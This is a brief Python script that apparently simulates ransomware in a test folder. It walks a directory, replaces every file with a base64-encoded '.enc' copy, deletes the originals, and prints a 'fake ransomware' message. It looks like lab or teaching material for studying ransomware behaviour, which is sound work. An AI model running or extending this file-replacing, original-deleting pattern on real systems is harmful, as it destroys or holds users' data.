import os
import base64

target_dir = "/home/nipun/ransomware_test/documents"

for root, dirs, files in os.walk(target_dir):
        for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                        content = f.read()
                encoded = base64.b64encode(content)
                with open(file_path + ".enc", "wb") as f:
                        f.write(encoded)
                os.remove(file_path)

print("[*] Fake ransomeware encryption completed.")
